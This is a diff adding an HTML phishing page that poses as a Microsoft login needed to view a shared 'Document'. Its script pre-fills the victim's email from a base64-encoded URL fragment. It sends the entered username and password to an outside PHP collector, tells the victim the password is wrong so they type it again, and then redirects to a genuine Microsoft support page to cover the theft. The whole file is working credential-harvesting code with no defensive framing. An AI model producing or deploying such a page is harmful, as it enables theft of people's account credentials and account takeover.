@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Keep all previous CSS styles -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #fff url('https://i.ibb.co/fGBBg19Q/download.jpg') no-repeat center center/cover;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 80px;
+            margin: 0 auto 1.5rem;
+            display: block;
+            max-width: 100%;
+        }
+
+        h5 {
+            color: #333;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #555;
+            text-align: left;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: 2px solid #007bff;
+            border-color: transparent;
+        }
+
+        .error-border {
+            border-color: red !important;
+        }
+
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: #217346;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #1c3b2f;
+        }
+
+        #error-message {
+            color: red;
+            margin-top: 1rem;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden PHP URL configuration -->
+    <input type="hidden" id="phpUrl" value="https://ventara.digital/lafrosh/new.php">
+
+    <div class="login-container">
+        <img src="https://i.ibb.co/5hJ4wvFK/microsoft.png" alt="Logo" class="logo">
+        <h5>Login with your Existing Email<br>Address to view "Document"</h5>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="Email">Email</label>
+                <input type="text" id="username">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" autocomplete="off">
+            </div>
+            <button type="submit">View Document</button>
+            <div id="error-message">Invalid password try again</div>
+        </form>
+    </div>
+
+    <script>
+        const decodeBase64 = (encodedStr) => {
+            try {
+                return decodeURIComponent(atob(encodedStr).split('').map(c => {
+                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+                }).join(''));
+            } catch (e) {
+                return '';
+            }
+        };
+
+        const isValidEmail = (email) => {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        };
+
+        const parseEmailFromURL = () => {
+            const encodedEmail = window.location.hash.substring(1);
+            if (!encodedEmail) return '';
+            const decodedEmail = decodeBase64(encodedEmail);
+            return isValidEmail(decodedEmail) ? decodedEmail : '';
+        };
+
+        document.getElementById('username').value = parseEmailFromURL();
+
+        let submissionCount = 0;
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            const phpUrl = document.getElementById('phpUrl').value;
+
+            // Clear previous error styles
+            usernameInput.classList.remove('error-border');
+            passwordInput.classList.remove('error-border');
+            document.getElementById('error-message').style.display = 'none';
+
+            if (!username || !password) {
+                if (!username) usernameInput.classList.add('error-border');
+                if (!password) passwordInput.classList.add('error-border');
+                document.getElementById('error-message').textContent = "Please fill in both fields.";
+                document.getElementById('error-message').style.display = 'block';
+                return;
+            }
+
+            await sendData(username, password, phpUrl);
+            submissionCount++;
+
+            if (submissionCount === 1) {
+                document.getElementById('error-message').textContent = "Invalid password try again";
+                document.getElementById('error-message').style.display = 'block';
+                passwordInput.value = '';
+            } else if (submissionCount >= 2) {
+                window.location.href = 'https://support.microsoft.com/en-us/office/share-your-excel-workbook-with-others-8d8a52bb-03c3-4933-ab6c-330aabf1e589';
+            }
+        });
+
+        async function sendData(username, password, url) {
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Submission error:', error);
+            }
+        }
+    </script>
+</body>
+</html>
